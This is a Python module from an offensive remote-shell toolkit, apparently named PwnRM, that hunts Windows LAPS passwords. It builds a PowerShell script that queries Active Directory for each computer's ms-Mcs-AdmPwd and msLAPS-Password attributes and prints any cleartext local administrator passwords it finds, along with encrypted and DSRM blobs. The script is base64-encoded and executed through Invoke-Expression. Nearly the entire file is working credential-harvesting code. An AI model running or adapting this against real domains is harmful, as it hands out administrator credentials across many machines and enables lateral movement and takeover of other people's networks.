"""
modules.laps — Windows LAPS & Azure LAPS Password Hunter
Extracts Legacy LAPS (ms-Mcs-AdmPwd) and Modern Windows Server 2025 / Windows 11 LAPS (msLAPS-Password / msLAPS-EncryptedPassword) directly via in-memory LDAP queries.
"""

from typing import List, Any
from . import BaseModule
from ..shell.ui import c, R, G, Y, B, M, C, DIM, BLD, RST
from ..shell.commands import b64str


class LAPSModule(BaseModule):
    name = "laps"
    description = "Windows LAPS Hunter (Legacy ms-Mcs-AdmPwd & Modern Server 2025 msLAPS-Password)"
    author = "uziii2208"
    options = {
        "-a": {"desc": "Enumerate all computers (including expired LAPS passwords)"},
        "--encrypted": {"desc": "Filter and display modern encrypted LAPS blobs (msLAPS-EncryptedPassword)"},
    }

    def run(self, shell, args: List[str]) -> Any:
        unknown = [arg for arg in args if arg not in {"-a", "--all", "--encrypted"}]
        if unknown:
            shell.write_warning(f"  [-] Unknown LAPS option(s): {', '.join(unknown)}")
            return {"status": "error", "error": "invalid options"}
        show_all = "-a" in args or "--all" in args
        filter_encrypted = "--encrypted" in args
        show_encrypted_ps = "$true" if (filter_encrypted or show_all) else "$false"
        show_all_ps = "$true" if show_all else "$false"

        shell.write_info(c(M + BLD, "  [*] PwnRM LAPS Hunter — scanning Active Directory for LAPS passwords (Legacy & Server 2025)..."))

        ps = f"""
$ErrorActionPreference = 'SilentlyContinue'
Write-Host "`n========================================================" -ForegroundColor Cyan
Write-Host "   PwnRM Windows LAPS & Server 2025 Password Hunter" -ForegroundColor Cyan
Write-Host "========================================================`n" -ForegroundColor Cyan

$root = [adsi]"LDAP://RootDSE"
$defaultNC = $root.defaultNamingContext
$searcher = New-Object System.DirectoryServices.DirectorySearcher([adsi]"LDAP://$defaultNC")
$searcher.Filter = "(objectClass=computer)"
$searcher.PageSize = 500

$searcher.PropertiesToLoad.AddRange(@(
    "sAMAccountName", "dNSHostName", "operatingSystem",
    "ms-Mcs-AdmPwd", "ms-Mcs-AdmPwdExpirationTime",
    "msLAPS-Password", "msLAPS-EncryptedPassword",
    "msLAPS-EncryptedDSRMPassword", "msLAPS-PasswordHistory"
))

$comps = $searcher.FindAll()
$legacyCount = 0
$modernCount = 0
$encCount = 0
$dsrmCount = 0

Write-Host "  [*] Total Computers in Domain: $($comps.Count)" -ForegroundColor White
Write-Host "  [*] Auditing LAPS permissions and password attributes...`n" -ForegroundColor Gray

foreach ($c in $comps) {{
    $sam = $c.Properties["samaccountname"][0]
    $dns = $c.Properties["dnshostname"][0]
    $os  = $c.Properties["operatingsystem"][0]

    $legacyPwd = $c.Properties["ms-mcs-admpwd"][0]
    $legacyExp = $c.Properties["ms-mcs-admpwdexpirationtime"][0]
    $modernPwd = $c.Properties["mslaps-password"][0]
    $modernEnc = $c.Properties["mslaps-encryptedpassword"][0]
    $dsrmEnc = $c.Properties["mslaps-encrypteddsrmpassword"][0]
    $history = $c.Properties["mslaps-passwordhistory"]

    if ($legacyPwd) {{
        $legacyCount++
        $expDate = if ($legacyExp) {{ [datetime]::FromFileTime($legacyExp).ToString("yyyy-MM-dd HH:mm:ss") }} else {{ "unknown" }}
        Write-Host "  [!] [LEGACY LAPS CLEARTEXT] $sam ($dns)" -ForegroundColor Red
        Write-Host "      - OS       : $os" -ForegroundColor Gray
        Write-Host "      - Password : $legacyPwd" -ForegroundColor Yellow
        Write-Host "      - Expires  : $expDate" -ForegroundColor DarkGray
    }}

    if ($modernPwd) {{
        $modernCount++
        Write-Host "  [!] [MODERN LAPS (Server 2025) CLEARTEXT] $sam ($dns)" -ForegroundColor Red
        Write-Host "      - OS       : $os" -ForegroundColor Gray
        Write-Host "      - Password : $modernPwd" -ForegroundColor Yellow
    }}

    if ($modernEnc) {{
        $encCount++
        $encB64 = [Convert]::ToBase64String($modernEnc)
        if ({show_encrypted_ps}) {{
            Write-Host "  [*] [MODERN LAPS ENCRYPTED BLOB] $sam ($dns)" -ForegroundColor Magenta
            Write-Host "      - OS         : $os" -ForegroundColor Gray
            Write-Host "      - Blob (B64) : $($encB64.Substring(0, [Math]::Min(40, $encB64.Length)))..." -ForegroundColor DarkGray
        }}
    }}

    if ($dsrmEnc) {{
        $dsrmCount++
        if ({show_encrypted_ps}) {{
            $dsrmB64 = [Convert]::ToBase64String($dsrmEnc)
            Write-Host "  [*] [MODERN LAPS ENCRYPTED DSRM] $sam ($dns)" -ForegroundColor Magenta
            Write-Host "      - Blob (B64) : $($dsrmB64.Substring(0, [Math]::Min(40, $dsrmB64.Length)))..." -ForegroundColor DarkGray
        }}
    }}

    if ({show_all_ps} -and -not $legacyPwd -and -not $modernPwd -and -not $modernEnc -and -not $dsrmEnc) {{
        Write-Host "  [-] [NO READABLE LAPS] $sam ($dns) — $os" -ForegroundColor DarkGray
    }} elseif ({show_all_ps} -and $history) {{
        Write-Host "      - Password history entries: $($history.Count)" -ForegroundColor DarkGray
    }}
}}

Write-Host "`n[LAPS Audit Summary]" -ForegroundColor Cyan
Write-Host "  Legacy LAPS Passwords Decrypted : $legacyCount" -ForegroundColor $(if ($legacyCount -gt 0) {{ "Red" }} else {{ "Green" }})
Write-Host "  Modern LAPS Cleartext Passwords : $modernCount" -ForegroundColor $(if ($modernCount -gt 0) {{ "Red" }} else {{ "Green" }})
Write-Host "  Modern LAPS Encrypted Blobs     : $encCount" -ForegroundColor White
Write-Host "  Modern LAPS Encrypted DSRM      : $dsrmCount" -ForegroundColor White

if ($legacyCount -eq 0 -and $modernCount -eq 0 -and $encCount -eq 0) {{
    Write-Host "`n  [-] No LAPS passwords found (or current user lacks read permissions on ms-Mcs-AdmPwd / msLAPS-Password)." -ForegroundColor Yellow
}}
Write-Host "`n  [*] LAPS audit complete." -ForegroundColor Cyan
"""
        encoded = b64str(ps.encode("utf-16le"))
        cmd = f"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{encoded}')))"
        if shell.run_with_interrupt(cmd, shell.write_line):
            return {"status": "interrupted"}
        return {"status": "completed", "all_computers": show_all, "encrypted": filter_encrypted}
